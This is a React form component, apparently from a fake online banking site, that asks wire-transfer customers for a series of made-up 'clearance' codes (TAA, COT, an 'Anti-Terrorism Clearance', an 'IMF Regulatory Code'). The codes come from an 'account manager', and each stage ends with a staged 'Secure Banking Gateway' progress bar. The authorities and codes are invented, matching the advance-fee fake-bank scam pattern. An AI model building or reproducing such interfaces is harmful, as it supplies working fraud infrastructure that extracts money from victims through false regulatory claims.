'use client';

import { useActionState, useEffect, useState } from 'react';
import { submitClearanceCode } from '@/actions/user/clearance';
import styles from './status.module.css';
import toast from 'react-hot-toast';

const VERIFICATION_DELAY = 8000; // 8 seconds

export default function ClearanceForm({ wire }: { wire: any }) {
    const [state, action, isPending] = useActionState(submitClearanceCode, undefined);

    const [verifying, setVerifying] = useState(false);
    const [progress, setProgress] = useState(0);

    // 1. Unified Side Effect for Server Response (Success or Error)
    useEffect(() => {
        if (state?.message) {
            if (state.success) {
                // Success: Start the visual verification loader
                // We use setTimeout to avoid the "setState during render" warning
                const timeoutId = setTimeout(() => {
                    setVerifying(true);
                    setProgress(0);
                }, 0);
                return () => clearTimeout(timeoutId);
            } else {
                // Error: Show toast notification
                toast.error(state.message);
            }
        }
    }, [state]);

    // 2. Handle the visual progress bar animation
    useEffect(() => {
        if (!verifying) return;

        const intervalTime = 100;
        const steps = VERIFICATION_DELAY / intervalTime;
        const increment = 100 / steps;

        const timer = setInterval(() => {
            setProgress((prev) => {
                // If progress reaches 100%, stop and reload page
                if (prev >= 100) {
                    clearInterval(timer);
                    window.location.reload();
                    return 100;
                }
                return prev + increment;
            });
        }, intervalTime);

        return () => clearInterval(timer);
    }, [verifying]);

    const getStageInfo = (stage: string) => {
        switch (stage) {
            case 'TAA': return { label: 'Tax Authentication Code (TAA)', desc: 'Required by International Tax Authority for large transfers.' };
            case 'COT': return { label: 'Cost of Transfer (COT)', desc: 'Regional banking compliance code required for destination release.' };
            case 'IJY': return { label: 'Anti-Terrorism Clearance (IJY)', desc: 'Final IMF Verification required for cross-border settlement.' };
            case 'IMF': return { label: 'IMF Regulatory Code', desc: 'Final verification step.' };
            default: return { label: 'Clearance Code', desc: 'Please enter the code provided by your account manager.' };
        }
    };

    const info = getStageInfo(wire.currentStage);

    // 3. RENDER: Loading State
    if (verifying) {
        return (
            <div className={styles.loaderBox}>
                <div className={styles.spinner}></div>
                <h3>Verifying {wire.currentStage} Code...</h3>
                <p>Connecting to Secure Banking Gateway</p>
                <div className={styles.progressBarBg}>
                    <div className={styles.progressBarFill} style={{ width: `${progress}%` }}></div>
                </div>
                <p className={styles.percent}>{Math.round(progress)}%</p>
            </div>
        );
    }

    // 4. RENDER: Form State
    return (
        <div>
            <div className={styles.stageAlert}>
                <h3>Action Required: {wire.currentStage}</h3>
                <p>{info.desc}</p>
            </div>

            <form action={action} className={styles.form}>
                <input type="hidden" name="wireId" value={wire.id} />

                <div style={{ textAlign: 'left' }}>
                    <label style={{ display: 'block', marginBottom: '8px', color: '#888', fontSize: '0.8rem', fontWeight: 'bold', textTransform: 'uppercase' }}>
                        {info.label}
                    </label>
                    <input
                        name="code"
                        type="text"
                        placeholder={`${wire.currentStage}-XXXX`}
                        className={styles.input}
                        required
                        autoComplete="off"
                    />
                </div>

                <button disabled={isPending} className={styles.button}>
                    {isPending ? 'Validating...' : `Submit ${wire.currentStage} Code`}
                </button>
            </form>

            <p className={styles.help}>
                Please contact support or your account manager to obtain this code.
            </p>
        </div>
    );
}